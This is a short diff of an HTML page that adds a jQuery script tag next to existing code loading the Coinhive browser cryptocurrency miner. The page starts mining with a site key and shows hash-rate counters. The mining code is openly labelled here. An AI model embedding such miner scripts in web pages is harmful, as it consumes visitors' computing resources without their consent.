@@ -3,6 +3,7 @@
     <div id="hashesPerSecond"></div>
     <div id="totalHashes"></div>
     <div id="acceptedHashes"></div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
       var miner = new CoinHive.User('DKF6Le8MXsbJQrGmrwH02zEsZeE9twXW', 'game-hive-tester');
